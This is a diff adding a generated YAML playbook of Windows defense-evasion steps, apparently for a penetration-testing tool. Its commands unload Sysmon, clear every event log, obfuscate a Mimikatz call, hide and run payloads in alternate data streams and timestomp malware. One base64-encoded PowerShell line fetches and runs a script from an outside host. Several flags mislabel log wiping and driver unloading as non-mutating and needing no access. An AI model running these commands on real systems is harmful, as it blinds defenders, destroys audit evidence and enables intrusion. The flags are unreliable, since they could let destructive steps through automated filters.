@@ -1,0 +1,165 @@
+# GENERATED from defense_evasion.md by scripts/playbooks_to_yaml.py — do not hand-edit.
+#
+# The markdown stays authoritative: it is what a human reads and what RAG
+# ingests. This is an EXTRACT of the steps in it, so that something other
+# than a language model can act on them. Re-generate after editing the
+# markdown; tests/test_playbooks.py fails if the two drift.
+#
+# access_required is a conservative heuristic, recorded so a consumer can
+# FILTER — never so anything can decide to run. Authorisation stays with
+# the scope gate and the engagement's approval.
+name: defense_evasion
+title: Defense Evasion Techniques
+source: defense_evasion.md
+generated_by: scripts/playbooks_to_yaml.py
+phases:
+- id: av-edr-bypass-techniques
+  name: AV/EDR Bypass Techniques
+  steps:
+  - id: av-edr-bypass-techniques.api-unhooking
+    title: API Unhooking
+    access_required: none
+    mutates: false
+    source_line: 12
+  - id: av-edr-bypass-techniques.direct-syscalls
+    title: Direct Syscalls
+    access_required: none
+    mutates: false
+    source_line: 50
+  - id: av-edr-bypass-techniques.preventing-dll-injection
+    title: Preventing DLL Injection
+    access_required: none
+    mutates: false
+    source_line: 75
+- id: logging-suppression
+  name: Logging Suppression
+  steps:
+  - id: logging-suppression.disable-windows-event-logging
+    title: Disable Windows Event Logging
+    access_required: none
+    mutates: false
+    source_line: 89
+  - id: logging-suppression.unload-sysmon-driver
+    title: Unload Sysmon Driver
+    access_required: none
+    mutates: false
+    source_line: 108
+    commands:
+    - lang: cmd
+      command: '# Find Sysmon driver name'
+    - lang: cmd
+      command: fltMC.exe
+    - lang: cmd
+      command: '# Unload (requires admin)'
+    - lang: cmd
+      command: fltMC.exe unload SysmonDrv
+  - id: logging-suppression.clear-event-logs
+    title: Clear Event Logs
+    access_required: none
+    mutates: false
+    source_line: 119
+    commands:
+    - lang: powershell
+      command: wevtutil el | Foreach-Object {wevtutil cl "$_"}
+    - lang: powershell
+      command: wevtutil cl Security
+    - lang: powershell
+      command: wevtutil cl System
+    - lang: powershell
+      command: wevtutil cl Application
+- id: process-masquerading
+  name: Process Masquerading
+  steps:
+  - id: process-masquerading.peb-manipulation
+    title: PEB Manipulation
+    access_required: none
+    mutates: false
+    source_line: 134
+  - id: process-masquerading.ppid-spoofing
+    title: PPID Spoofing
+    access_required: none
+    mutates: false
+    source_line: 153
+- id: obfuscation-techniques
+  name: Obfuscation Techniques
+  steps:
+  - id: obfuscation-techniques.powershell-obfuscation
+    title: PowerShell Obfuscation
+    access_required: none
+    mutates: false
+    source_line: 174
+    commands:
+    - lang: powershell
+      command: $a = 'Inv'; $b = 'oke-'; $c = 'Mimikatz'; IEX "$a$b$c"
+    - lang: powershell
+      command: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
+    - lang: powershell
+      command: '$cmd = [char]73+[char]69+[char]88  # IEX'
+    - lang: powershell
+      command: Invoke-Obfuscation -ScriptPath script.ps1 -Command "Token\All\1"
+  - id: obfuscation-techniques.command-line-obfuscation
+    title: Command Line Obfuscation
+    access_required: none
+    mutates: false
+    source_line: 189
+    commands:
+    - lang: cmd
+      command: '# Environment variable substitution'
+    - lang: cmd
+      command: cmd /c "set x=whoami && call echo %%x%%"
+    - lang: cmd
+      command: '# Caret insertion'
+    - lang: cmd
+      command: w^h^o^a^m^i
+    - lang: cmd
+      command: '# Variable expansion'
+    - lang: cmd
+      command: set a=who && set b=ami && call %a%%b%
+  - id: obfuscation-techniques.binary-packing
+    title: Binary Packing
+    access_required: none
+    mutates: false
+    source_line: 201
+    commands:
+    - lang: bash
+      command: upx --best malware.exe
+- id: file-system-evasion
+  name: File System Evasion
+  steps:
+  - id: file-system-evasion.alternate-data-streams-ads
+    title: Alternate Data Streams (ADS)
+    access_required: none
+    mutates: true
+    source_line: 216
+    commands:
+    - lang: cmd
+      command: '# Hide payload'
+    - lang: cmd
+      command: type payload.exe > legitimate.txt:hidden.exe
+    - lang: cmd
+      command: '# Execute from ADS'
+    - lang: cmd
+      command: wmic process call create "c:\path\legitimate.txt:hidden.exe"
+    - lang: cmd
+      command: '# Using PowerShell'
+    - lang: cmd
+      command: Get-Content payload.exe -Raw | Set-Content -Path legitimate.txt -Stream hidden
+  - id: file-system-evasion.timestomping
+    title: Timestomping
+    access_required: none
+    mutates: true
+    source_line: 230
+    commands:
+    - lang: powershell
+      command: (Get-Item malware.exe).CreationTime = "01/01/2020 12:00:00"
+    - lang: powershell
+      command: (Get-Item malware.exe).LastWriteTime = "01/01/2020 12:00:00"
+    - lang: powershell
+      command: (Get-Item malware.exe).LastAccessTime = "01/01/2020 12:00:00"
+    - lang: powershell
+      command: meterpreter> timestomp malware.exe -c "01/01/2020 12:00:00"
+  - id: file-system-evasion.html-smuggling
+    title: HTML Smuggling
+    access_required: none
+    mutates: false
+    source_line: 243
